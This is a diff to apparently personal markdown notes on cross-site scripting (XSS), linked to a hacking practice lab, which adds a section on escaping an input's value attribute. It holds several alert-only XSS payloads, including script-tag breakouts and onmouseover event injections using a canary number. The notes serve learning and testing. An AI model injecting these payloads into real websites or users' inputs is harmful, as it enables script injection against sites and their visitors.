@@ -3,7 +3,7 @@
 ## xss  
 [https://app.hackinghub.io/hubs/nbbc-xss](https://app.hackinghub.io/hubs/nbbc-xss)    
 
-### Example XSS Payloads  
+### basic xss  
 - The number `19628397001` is just a random number that can be used as a [canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to search proxy history for the value.  
 
 ```
@@ -20,5 +20,21 @@
 <script src="data:text/javascript,alert(19628397001)"></object>
 </p><h1><u/onmouseover=alert(1)>19628397001
 ```
+
+### contexts  
+
+value inside an input:  
+`<input value="19628397001">`  
+
+try to break out with a payload like...    
+```
+test"><script>alert(19628397001)</script>
+```
+
+or use an event like this...  
+```
+test" onmouseover=alert(19628397001);//
+```
+
 
 
